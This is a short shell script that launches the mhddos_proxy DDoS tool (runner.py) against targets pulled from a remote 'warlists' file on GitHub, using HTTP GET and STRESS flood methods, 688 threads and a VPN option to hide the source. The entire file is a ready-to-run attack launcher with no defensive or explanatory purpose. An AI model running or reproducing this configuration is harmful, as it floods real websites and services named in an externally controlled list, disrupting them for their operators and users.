#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_get-stress.lst \
  --http-methods GET STRESS \
  --lang en \
  --threads 688 \
  --vpn
